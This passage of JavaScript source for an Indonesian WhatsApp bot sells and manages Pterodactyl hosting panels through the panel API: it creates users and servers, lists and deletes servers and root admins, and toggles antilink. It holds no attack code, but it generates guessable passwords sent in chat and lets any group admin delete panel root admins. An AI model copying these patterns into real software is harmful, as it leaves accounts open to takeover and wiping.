  // Pisah input nama dan nomor/tag
  let [nama, nomorInput] = text.split(',');
  if (!nama || !nomorInput) return Reply(example("nama,@tag"));

  nama = nama.trim();

  // Ambil nomor dari mention kalau ada, atau dari input manual
  let nomor;
  if (m.mentionedJid && m.mentionedJid.length) {
    nomor = m.mentionedJid[0].split('@')[0];
  } else {
    nomor = nomorInput.trim().replace(/\D/g, '');
  }

  if (!/^(\d{10,15})$/.test(nomor)) return Reply("❌ Nomor tidak valid!");

  // Simpan sementara
  global.tempCadmin = global.tempCadmin || {};
  global.tempCadmin[m.sender] = {
    username: nama.toLowerCase().replace(/\s+/g, ''),
    name: capital(nama),
    nomor: nomor
  };

  const jidTag = `${nomor}@s.whatsapp.net`;

  await conn.sendMessage(m.chat, {
    image: { url: global.image.reply },
    caption: `🧩 *Nama:* ${capital(nama)}\n📱 *@${nomor}*\n\nSilakan pilih server untuk membuat Admin Panel:`,
    footer: `© 2025 ${botname}`,
    buttons: [
      { buttonId: `.cadmin-v1 ${nama},${nomor}`, buttonText: { displayText: "🌐 Panel Server V1" }, type: 1 },
      { buttonId: `.cadmin-v2 ${nama},${nomor}`, buttonText: { displayText: "🌐 Panel Server V2" }, type: 1 }
    ],
    headerType: 4,
    contextInfo: { mentionedJid: [jidTag] }
  }, { quoted: m });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
  try {
    if (!isCreator && !jangan2) return Reply(mess.owner)
    if (!text) return m.reply(example("username"))
    global.panel = text

    var ram, disknya, cpu
    if (command == "1gb-v2") { ram="1000"; disknya="1000"; cpu="40" }
    else if (command == "2gb-v2") { ram="2000"; disknya="1000"; cpu="60" }
    else if (command == "3gb-v2") { ram="3000"; disknya="2000"; cpu="80" }
    else if (command == "4gb-v2") { ram="4000"; disknya="2000"; cpu="100" }
    else if (command == "5gb-v2") { ram="5000"; disknya="3000"; cpu="120" }
    else if (command == "6gb-v2") { ram="6000"; disknya="3000"; cpu="140" }
    else if (command == "7gb-v2") { ram="7000"; disknya="4000"; cpu="160" }
    else if (command == "8gb-v2") { ram="8000"; disknya="4000"; cpu="180" }
    else if (command == "9gb-v2") { ram="9000"; disknya="5000"; cpu="200" }
    else if (command == "10gb-v2") { ram="10000"; disknya="5000"; cpu="220" }
    else { ram="0"; disknya="0"; cpu="0" }

    let username = global.panel.toLowerCase() + crypto.randomBytes(2).toString('hex')
    let email = username+"@gmail.com"
    let name = capital(username) + " Server"
    let password = username+crypto.randomBytes(2).toString('hex')

    let f = await fetch(domainV2 + "/api/application/users", {
      "method": "POST",
      "headers": {"Accept": "application/json","Content-Type": "application/json","Authorization": "Bearer " + apikeyV2},
      "body": JSON.stringify({
        "email": email,
        "username": username,
        "first_name": name,
        "last_name": "Server",
        "language": "en",
        "password": password
      })
    })
    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))

    let user = data.attributes
    let desc = tanggal(Date.now())
    let usr_id = user.id

    let f1 = await fetch(domainV2 + `/api/application/nests/${nestid}/eggs/` + egg, {
      "method": "GET",
      "headers": {"Accept": "application/json","Content-Type": "application/json","Authorization": "Bearer " + apikeyV2}
    })
    let data2 = await f1.json();
    let startup_cmd = data2.attributes.startup

    let f2 = await fetch(domainV2 + "/api/application/servers", {
      "method": "POST",
      "headers": {"Accept": "application/json","Content-Type": "application/json","Authorization": "Bearer " + apikeyV2},
      "body": JSON.stringify({
        "name": name,
        "description": desc,
        "user": usr_id,
        "egg": parseInt(egg),
        "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
        "startup": startup_cmd,
        "environment": {"INST":"npm","USER_UPLOAD":"0","AUTO_UPDATE":"0","CMD_RUN":"npm start"},
        "limits": {"memory": ram,"swap": 0,"disk": disknya,"io": 500,"cpu": cpu},
        "feature_limits": {"databases": 5,"backups": 5,"allocations": 5},
        deploy: {locations: [parseInt(loc)],dedicated_ip: false,port_range: []}
      })
    })
    let result = await f2.json()
    if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))

    let server = result.attributes

    var orang = m.isGroup ? m.sender : m.chat
    if (m.isGroup) await m.reply("*✅ Berhasil membuat panel!*\nData sudah dikirim ke private chat")

    var teks = `*✅ Berhasil Membuat Panel Kamu!*

📡 *ID Server:* ${server.id}
👤 *Username:* ${user.username}
🔐 *Password:* ${password}

🌐 *Spesifikasi:*
• RAM: ${ram=="0"?"Unlimited":ram/1000+"GB"}
• Disk: ${disknya=="0"?"Unlimited":disknya/1000+"GB"}
• CPU: ${cpu=="0"?"Unlimited":cpu+"%"}

🌍 ${global.domainV2}

⚠️ *Syarat & Ketentuan:*
- Expired 1 bulan
- Garansi 15 hari (1x replace)
- Claim garansi wajib bawa bukti chat pembelian
`

    // Kirim pakai nativeFlowMessage
    let msgii = await generateWAMessageFromContent(orang, {
      viewOnceMessage: {
        message: {
          messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: { mentionedJid: [m.sender] },
            body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [
                {"name":"cta_url","buttonParamsJson":`{"display_text":"🌐 Login Server Panel","url":"${global.domainV2}"}`},
                {"name":"cta_copy","buttonParamsJson":`{"display_text":"📋 Copy Username","copy_code":"${user.username}"}`},
                {"name":"cta_copy","buttonParamsJson":`{"display_text":"📋 Copy Password","copy_code":"${password}"}`}
              ]
            })
          })
        }
      }
    }, { userJid: orang, quoted: m })

    await conn.relayMessage(orang, msgii.message, { messageId: msgii.key.id })
    delete global.panel

  } catch (e) {
    console.error(e)
    m.reply("❌ Terjadi error: " + e.message)
  }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listadmin-v2": {
  if (!isCreator && !isPremium) return Reply(mess.owner)

  let page = 1;
  let teks = " *乂 List admin panel pterodactyl*\n";
  let totalAdmins = 0;

  try {
    while (true) {
      let cek = await fetch(`${domainV2}/api/application/users?page=${page}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: "Bearer " + apikeyV2,
        },
      });

      let res = await cek.json();
      let users = res.data;

      if (!users || users.length < 1) break;

      for (let i of users) {
        if (i.attributes.root_admin !== true) continue;
        totalAdmins++;
        teks += `\n*ID:* ${i.attributes.id}\n*Nama:* ${i.attributes.first_name}\n*Created:* ${i.attributes.created_at.split("T")[0]}\n`;
      }

      // Jika tidak ada halaman berikutnya, keluar dari loop
      if (!res.meta.pagination || !res.meta.pagination.links || !res.meta.pagination.links.next) break;

      page++; // lanjut ke halaman berikutnya
    }

    if (totalAdmins < 1) return m.reply("❌ Tidak ada admin panel ditemukan.");

    await conn.sendMessage(m.chat, {
      buttons: [
        {
          buttonId: `.deladmin-v2`,
          buttonText: { displayText: '🗑 Hapus Admin Panel' },
          type: 1,
        },
      ],
      footer: `© 2025 ${botname}`,
      headerType: 1,
      viewOnce: true,
      text: teks,
      contextInfo: {
        isForwarded: true,
        mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
      },
    }, { quoted: m });

  } catch (err) {
    console.error(err);
    Reply("❌ Gagal mengambil data admin. Pastikan domain dan apikey benar.");
  }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deladmin-v2": {
  if (!isCreator && !m.isGroupAdmin) return Reply(mess.owner)

  if (!text) {
    return Reply("⚠️ Masukkan ID admin panel yang ingin dihapus!\n" +
      "Cek dulu ID admin dengan perintah:\n" +
      "`.listadmin-v2`.")
  }

  let idadmin = Number(text.trim())
  if (isNaN(idadmin)) return m.reply("⚠️ ID admin harus berupa angka valid!")

  let valid = false
  let username = null
  let page = 1

  while (true) {
    let res = await fetch(`${domainV2}/api/application/users?page=${page}`, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikeyV2
      }
    })

    if (!res.ok) break;

    let res2 = await res.json()
    let users = res2.data

    if (!users || users.length < 1) break

    for (let user of users) {
      if (user.attributes.id === idadmin && user.attributes.root_admin === true) {
        valid = true
        username = user.attributes.username
        break
      }
    }

    if (valid) break

    // Cek apakah ada halaman berikutnya
    if (!res2.meta || !res2.meta.pagination || !res2.meta.pagination.links || !res2.meta.pagination.links.next) break;

    page++
  }

  if (!valid) return m.reply("❌ ID admin panel tidak ditemukan atau bukan root admin.")

  let delusr = await fetch(`${domainV2}/api/application/users/${idadmin}`, {
    method: "DELETE",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + apikeyV2
    }
  })

  if (!delusr.ok) return m.reply("❌ Gagal menghapus admin panel!")

  m.reply(`✅ Berhasil menghapus akun admin panel *${capital(username)}* (ID: ${idadmin})`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink": {
  if (!m.isGroup) return Reply(mess.group);
  if (!isCreator) return Reply(mess.owner);

  const teks = `🚨 *PENGATURAN ANTILINK*\nSilakan pilih mode dan status yang ingin kamu aktifkan atau nonaktifkan:\n\n` +
               `*V1:* Kick member yang mengirim link grup WhatsApp\n` +
               `*V2:* Hapus pesan yang mengandung link grup WhatsApp`;

  await conn.sendMessage(m.chat, {
    caption: teks,
    image: { url: global.image.reply },
    footer: `© 2025 ${botname}`,
    buttons: [
      { buttonId: `${prefix}antilink-v1 on`, buttonText: { displayText: '✅ Aktifkan Antilink V1' }, type: 1 },
      { buttonId: `${prefix}antilink-v1 off`, buttonText: { displayText: '❌ Nonaktifkan Antilink V1' }, type: 1 },
      { buttonId: `${prefix}antilink-v2 on`, buttonText: { displayText: '✅ Aktifkan Antilink V2' }, type: 1 },
      { buttonId: `${prefix}antilink-v2 off`, buttonText: { displayText: '❌ Nonaktifkan Antilink V2' }, type: 1 }
    ],
    headerType: 1,
    viewOnce: true
  }, { quoted: m });
}
break;

case "antilink-v1": {
  if (!m.isGroup) return Reply(mess.group);
  if (!isCreator) return Reply(mess.owner);
  if (!text) return Reply(example("on/off"));

  let teks = text.toLowerCase();
  if (teks === "on") {
    if (global.db.groups[m.chat].antilink) return Reply("*Antilink V1* sudah aktif!");
    global.db.groups[m.chat].antilink = true;
    global.db.groups[m.chat].antilink2 = false;
    return Reply("✅ *Antilink V1* berhasil diaktifkan. Siapa pun yang mengirim link akan *dikeluarkan*.");
  } else if (teks === "off") {
    if (!global.db.groups[m.chat].antilink) return Reply("*Antilink V1* sudah nonaktif.");
    global.db.groups[m.chat].antilink = false;
    return Reply("❌ *Antilink V1* berhasil dinonaktifkan.");
  } else {
    return Reply(example("on/off"));
  }
}
break;

case "antilink-v2": {
  if (!m.isGroup) return Reply(mess.group);
  if (!isCreator) return Reply(mess.owner);
  if (!text) return Reply(example("on/off"));

  let teks = text.toLowerCase();
  if (teks === "on") {
    if (global.db.groups[m.chat].antilink2) return Reply("*Antilink V2* sudah aktif!");
    global.db.groups[m.chat].antilink2 = true;
    global.db.groups[m.chat].antilink = false;
    return Reply("✅ *Antilink V2* berhasil diaktifkan. Pesan yang mengandung link akan *dihapus*.");
  } else if (teks === "off") {
    if (!global.db.groups[m.chat].antilink2) return Reply("*Antilink V2* sudah nonaktif.");
    global.db.groups[m.chat].antilink2 = false;
    return Reply("❌ *Antilink V2* berhasil dinonaktifkan.");
  } else {
    return Reply(example("on/off"));
  }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listpanel": {
  if (!isCreator && !isPremium) return Reply(mess.owner);
  const fetch = require("node-fetch");

  let page = parseInt(text) || 1; // default page 1 jika user tidak kasih angka
  if (page < 1) page = 1;

  try {
    let f = await fetch(`${domain}/api/application/servers?page=${page}`, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikey
      }
    });

    let res = await f.json();
    let servers = res.data;

    if (!servers || servers.length === 0) return Reply(`❌ Tidak ada server di halaman ${page}`);

    let textList = `*乂 LIST SERVER PANEL - Page ${page}*\n\n`;

    for (let server of servers) {
      let s = server.attributes;
      textList += `• ID: *${s.id}*\n• Nama: *${s.name}*\n\n`;
    }

    textList += `Ketik *.listpanel ${page + 1}* untuk ke halaman berikutnya.`

    return m.reply(textList);

  } catch (err) {
    console.error(err);
    return Reply("❌ Gagal mengambil data dari API.");
  }
}
break;

case "delpanel": {
  if (!isCreator && !isPremium) return Reply(mess.owner);
  if (!text) return m.reply("Kirim ID server yang ingin dihapus. Contoh: .delpanel 12");

  const idToDelete = Number(text.trim());
  if (isNaN(idToDelete)) return m.reply("ID server harus berupa angka!");

  // Fungsi ambil semua server
  async function fetchAllServers() {
    let page = 1;
    let allServers = [];
    let hasNext = true;

    while (hasNext) {
      const res = await fetch(`${domain}/api/application/servers?page=${page}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: "Bearer " + apikey
        }
      });
      const json = await res.json();
      if (json.data.length > 0) {
        allServers.push(...json.data);
        page++;
      } else {
        hasNext = false;
      }
    }
    return allServers;
  }

  // Fungsi ambil semua user
  async function fetchAllUsers() {
    let page = 1;
    let allUsers = [];
    let hasNext = true;

    while (hasNext) {
      const res = await fetch(`${domain}/api/application/users?page=${page}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: "Bearer " + apikey
        }
      });
      const json = await res.json();
      if (json.data.length > 0) {
        allUsers.push(...json.data);
        page++;
      } else {
        hasNext = false;
      }
    }
    return allUsers;
  }

  let servers = await fetchAllServers();
  let foundServer = servers.find(s => s.attributes.id === idToDelete);
  if (!foundServer) return m.reply("ID server tidak ditemukan.");

  let serverName = foundServer.attributes.name;
  let sectionName = serverName.toLowerCase();

  // Hapus server
  await fetch(`${domain}/api/application/servers/${idToDelete}`, {
    method: "DELETE",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + apikey
    }
  });

  // Hapus user yang terkait (first_name = nama server)
  let users = await fetchAllUsers();
  let userToDelete = users.find(u => u.attributes.first_name.toLowerCase() === sectionName);
  if (userToDelete) {
    await fetch(`${domain}/api/application/users/${userToDelete.attributes.id}`, {
      method: "DELETE",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikey
      }
    });
  }

  m.reply(`✅ Berhasil menghapus server panel *${serverName}* (ID: ${idToDelete})`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
  try {
    if (!isCreator && !jangan) return Reply(mess.owner)
    if (!text) return m.reply(example("username"))
    global.panel = text

    var ram, disknya, cpu
    if (command == "1gb") { ram="1000"; disknya="1000"; cpu="40" }
    else if (command == "2gb") { ram="2000"; disknya="1000"; cpu="60" }
    else if (command == "3gb") { ram="3000"; disknya="2000"; cpu="80" }
    else if (command == "4gb") { ram="4000"; disknya="2000"; cpu="100" }
    else if (command == "5gb") { ram="5000"; disknya="3000"; cpu="120" }
    else if (command == "6gb") { ram="6000"; disknya="3000"; cpu="140" }
    else if (command == "7gb") { ram="7000"; disknya="4000"; cpu="160" }
    else if (command == "8gb") { ram="8000"; disknya="4000"; cpu="180" }
    else if (command == "9gb") { ram="9000"; disknya="5000"; cpu="200" }
    else if (command == "10gb") { ram="10000"; disknya="5000"; cpu="220" }
    else { ram="0"; disknya="0"; cpu="0" }

    let username = global.panel.toLowerCase() + crypto.randomBytes(2).toString('hex')
    let email = username+"@gmail.com"
    let name = capital(username) + " Server"
    let password = username+crypto.randomBytes(2).toString('hex')

    let f = await fetch(domain + "/api/application/users", {
      "method": "POST",
      "headers": {"Accept": "application/json","Content-Type": "application/json","Authorization": "Bearer " + apikey},
      "body": JSON.stringify({
        "email": email,
        "username": username,
        "first_name": name,
        "last_name": "Server",
        "language": "en",
        "password": password
      })
    })
    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))

    let user = data.attributes
    let desc = tanggal(Date.now())
    let usr_id = user.id

    let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
      "method": "GET",
      "headers": {"Accept": "application/json","Content-Type": "application/json","Authorization": "Bearer " + apikey}
    })
    let data2 = await f1.json();
    let startup_cmd = data2.attributes.startup

    let f2 = await fetch(domain + "/api/application/servers", {
      "method": "POST",
      "headers": {"Accept": "application/json","Content-Type": "application/json","Authorization": "Bearer " + apikey},
      "body": JSON.stringify({
        "name": name,
        "description": desc,
        "user": usr_id,
        "egg": parseInt(egg),
        "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
        "startup": startup_cmd,
        "environment": {"INST":"npm","USER_UPLOAD":"0","AUTO_UPDATE":"0","CMD_RUN":"npm start"},
        "limits": {"memory": ram,"swap": 0,"disk": disknya,"io": 500,"cpu": cpu},
        "feature_limits": {"databases": 5,"backups": 5,"allocations": 5},
        deploy: {locations: [parseInt(loc)],dedicated_ip: false,port_range: []}
      })
    })
    let result = await f2.json()
    if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))

    let server = result.attributes

    var orang = m.isGroup ? m.sender : m.chat
    if (m.isGroup) await m.reply("*✅ Berhasil membuat panel!*\nData sudah dikirim ke private chat")

    var teks = `*✅ Berhasil Membuat Panel Kamu!*

📡 *ID Server:* ${server.id}
👤 *Username:* ${user.username}
🔐 *Password:* ${password}

🌐 *Spesifikasi:*
• RAM: ${ram=="0"?"Unlimited":ram/1000+"GB"}
• Disk: ${disknya=="0"?"Unlimited":disknya/1000+"GB"}
• CPU: ${cpu=="0"?"Unlimited":cpu+"%"}

🌍 ${global.domain}

⚠️ *Syarat & Ketentuan:*
- Expired 1 bulan
- Garansi 15 hari (1x replace)
- Claim garansi wajib bawa bukti chat pembelian
`

    // Kirim pakai nativeFlowMessage
    let msgii = await generateWAMessageFromContent(orang, {
      viewOnceMessage: {
        message: {
          messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: { mentionedJid: [m.sender] },
            body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [
                {"name":"cta_url","buttonParamsJson":`{"display_text":"🌐 Login Server Panel","url":"${global.domain}"}`},
                {"name":"cta_copy","buttonParamsJson":`{"display_text":"📋 Copy Username","copy_code":"${user.username}"}`},
                {"name":"cta_copy","buttonParamsJson":`{"display_text":"📋 Copy Password","copy_code":"${password}"}`}
              ]
            })
          })
        }
      }
    }, { userJid: orang, quoted: m })

    await conn.relayMessage(orang, msgii.message, { messageId: msgii.key.id })
    delete global.panel

  } catch (e) {
    console.error(e)
    m.reply("❌ Terjadi error: " + e.message)
  }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listadmin": {
  if (!isCreator && !isPremium) return Reply(mess.owner)

  let page = 1;
  let teks = " *乂 List admin panel pterodactyl*\n";
  let totalAdmins = 0;

  try {
    while (true) {
      let cek = await fetch(`${domain}/api/application/users?page=${page}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: "Bearer " + apikey,
        },
      });

      let res = await cek.json();
      let users = res.data;

      if (!users || users.length < 1) break;

      for (let i of users) {
        if (i.attributes.root_admin !== true) continue;
        totalAdmins++;
        teks += `\n*ID:* ${i.attributes.id}\n*Nama:* ${i.attributes.first_name}\n*Created:* ${i.attributes.created_at.split("T")[0]}\n`;
      }

      // Jika tidak ada halaman berikutnya, keluar dari loop
      if (!res.meta.pagination || !res.meta.pagination.links || !res.meta.pagination.links.next) break;

      page++; // lanjut ke halaman berikutnya
    }

    if (totalAdmins < 1) return m.reply("❌ Tidak ada admin panel ditemukan.");

    await conn.sendMessage(m.chat, {
      buttons: [
        {
          buttonId: `.deladmin`,
          buttonText: { displayText: '🗑 Hapus Admin Panel' },
          type: 1,
        },
      ],
      footer: `© 2025 ${botname}`,
      headerType: 1,
      viewOnce: true,
      text: teks,
      contextInfo: {
        isForwarded: true,
        mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
      },
    }, { quoted: m });

  } catch (err) {
    console.error(err);
    Reply("❌ Gagal mengambil data admin. Pastikan domain dan apikey benar.");
  }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listpanel-v2": {
  if (!isCreator && !isPremium) return Reply(mess.owner);
  const fetch = require("node-fetch");

  let page = parseInt(text) || 1; // default page 1 jika user tidak kasih angka
  if (page < 1) page = 1;

  try {
    let f = await fetch(`${domainV2}/api/application/servers?page=${page}`, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikeyV2
      }
    });

    let res = await f.json();
    let servers = res.data;

    if (!servers || servers.length === 0) return Reply(`❌ Tidak ada server di halaman ${page}`);

    let textList = `*乂 LIST SERVER PANEL - Page ${page}*\n\n`;

    for (let server of servers) {
      let s = server.attributes;
      textList += `• ID: *${s.id}*\n• Nama: *${s.name}*\n\n`;
    }

    textList += `Ketik *.listpanel-v2 ${page + 1}* untuk ke halaman berikutnya.`

    return m.reply(textList);

  } catch (err) {
    console.error(err);
    return Reply("❌ Gagal mengambil data dari API.");
  }
}
break;

case "delpanel-v2": {
  if (!isCreator && !isPremium) return Reply(mess.owner);
  if (!text) return m.reply("Kirim ID server yang ingin dihapus. Contoh: .delpanel-v2 12");

  const idToDelete = Number(text.trim());
  if (isNaN(idToDelete)) return m.reply("ID server harus berupa angka!");

  // Fungsi ambil semua server
  async function fetchAllServers() {
    let page = 1;
    let allServers = [];
    let hasNext = true;

    while (hasNext) {
      const res = await fetch(`${domainV2}/api/application/servers?page=${page}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: "Bearer " + apikeyV2
        }
      });
      const json = await res.json();
      if (json.data.length > 0) {
        allServers.push(...json.data);
        page++;
      } else {
        hasNext = false;
      }
    }
    return allServers;
  }

  // Fungsi ambil semua user
  async function fetchAllUsers() {
    let page = 1;
    let allUsers = [];
    let hasNext = true;

    while (hasNext) {
      const res = await fetch(`${domainV2}/api/application/users?page=${page}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: "Bearer " + apikeyV2
        }
      });
      const json = await res.json();
      if (json.data.length > 0) {
        allUsers.push(...json.data);
        page++;
      } else {
        hasNext = false;
      }
    }
    return allUsers;
  }

  let servers = await fetchAllServers();
  let foundServer = servers.find(s => s.attributes.id === idToDelete);
  if (!foundServer) return m.reply("ID server tidak ditemukan.");

  let serverName = foundServer.attributes.name;
  let sectionName = serverName.toLowerCase();

  // Hapus server
  await fetch(`${domainV2}/api/application/servers/${idToDelete}`, {
    method: "DELETE",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + apikeyV2
    }
  });

  // Hapus user yang terkait (first_name = nama server)
  let users = await fetchAllUsers();
  let userToDelete = users.find(u => u.attributes.first_name.toLowerCase() === sectionName);
  if (userToDelete) {
    await fetch(`${domainV2}/api/application/users/${userToDelete.attributes.id}`, {
      method: "DELETE",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikeyV2
      }
    });
  }

  m.reply(`✅ Berhasil menghapus server panel *${serverName}* (ID: ${idToDelete})`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delalladmin": {
    if (!isCreator) return m.reply(`Fitur ini hanya untuk developer bot`);
    if (!text) return m.reply(`*Contoh penggunaan:*\n${cmd} admin1,admin2`);

    try {
        // Ambil semua admin dari semua halaman
        let page = 1;
        let allAdmins = [];

        while (true) {
            const res = await fetch(`${domain}/api/application/users?page=${page}`, {
                method: "GET",
                headers: {
                    Accept: "application/json",
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${apikey}`
                }
            });

            const data = await res.json();
            const users = data.data;

            if (!users || users.length === 0) break;

            allAdmins.push(...users.filter(u => u.attributes.root_admin === true));
            page++;
        }

        // Daftar admin yang tidak boleh dihapus (support multi nama dipisah koma)
        const daftarAman = text.split(",").map(a => a.trim().toLowerCase());

        // Filter admin yang boleh dihapus
        const targetAdmins = allAdmins.filter(
            user => !daftarAman.includes(user.attributes.username.toLowerCase())
        );

        if (targetAdmins.length === 0) {
            return m.reply("Tidak ada admin yang bisa dihapus (mungkin semua masuk daftar pengecualian).");
        }

        let sukses = 0;
        let gagal = [];

        for (const admin of targetAdmins) {
            const idadmin = admin.attributes.id;
            const username = admin.attributes.username;

            const delRes = await fetch(`${domain}/api/application/users/${idadmin}`, {
                method: "DELETE",
                headers: {
                    Accept: "application/json",
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${apikey}`
                }
            });

            if (delRes.ok) {
                sukses++;
            } else {
                gagal.push(username);
            }
        }

        let replyMsg = `✅ Sukses menghapus ${sukses} admin panel.`;
        if (daftarAman.length > 0) {
            replyMsg += `\n🙅‍♂️ Tidak dihapus: ${daftarAman.map(a => `*${a}*`).join(", ")}`;
        }
        if (gagal.length > 0) {
            replyMsg += `\n❌ Gagal hapus: ${gagal.map(u => `*${u}*`).join(", ")}`;
        }

        await m.reply(replyMsg);

    } catch (err) {
        console.error(err);
        m.reply("Terjadi kesalahan saat menghapus admin.");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delalladmin-v2": {
    if (!isCreator) return m.reply(`Fitur ini hanya untuk developer bot`);
    if (!text) return m.reply(`*Contoh penggunaan:*\n${cmd} admin1,admin2`);

    try {
        // Ambil semua admin dari semua halaman
        let page = 1;
        let allAdmins = [];

        while (true) {
            const res = await fetch(`${domainV2}/api/application/users?page=${page}`, {
                method: "GET",
                headers: {
                    Accept: "application/json",
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${apikeyV2}`
                }
            });

            const data = await res.json();
            const users = data.data;

            if (!users || users.length === 0) break;

            allAdmins.push(...users.filter(u => u.attributes.root_admin === true));
            page++;
        }

        // Daftar admin yang tidak boleh dihapus (support multi nama dipisah koma)
        const daftarAman = text.split(",").map(a => a.trim().toLowerCase());

        // Filter admin yang boleh dihapus
        const targetAdmins = allAdmins.filter(
            user => !daftarAman.includes(user.attributes.username.toLowerCase())
        );

        if (targetAdmins.length === 0) {
            return m.reply("Tidak ada admin yang bisa dihapus (mungkin semua masuk daftar pengecualian).");
        }

        let sukses = 0;
        let gagal = [];

        for (const admin of targetAdmins) {
            const idadmin = admin.attributes.id;
            const username = admin.attributes.username;

            const delRes = await fetch(`${domainV2}/api/application/users/${idadmin}`, {
                method: "DELETE",
                headers: {
                    Accept: "application/json",
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${apikeyV2}`
                }
            });

            if (delRes.ok) {
                sukses++;
            } else {
                gagal.push(username);
            }
        }

        let replyMsg = `✅ Sukses menghapus ${sukses} admin panel.`;
        if (daftarAman.length > 0) {
            replyMsg += `\n🙅‍♂️ Tidak dihapus: ${daftarAman.map(a => `*${a}*`).join(", ")}`;
        }
        if (gagal.length > 0) {
            replyMsg += `\n❌ Gagal hapus: ${gagal.map(u => `*${u}*`).join(", ")}`;
        }

        await m.reply(replyMsg);

    } catch (err) {
        console.error(err);
        m.reply("Terjadi kesalahan saat menghapus admin.");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deladmin": {
  if (!isCreator && !m.isGroupAdmin) return Reply(mess.owner)

  if (!text) {
    return Reply("⚠️ Masukkan ID admin panel yang ingin dihapus!\n" +
      "Cek dulu ID admin dengan perintah:\n" +
      "`.listadmin`.")
  }

  let idadmin = Number(text.trim())
  if (isNaN(idadmin)) return m.reply("⚠️ ID admin harus berupa angka valid!")

  let valid = false
  let username = null
  let page = 1

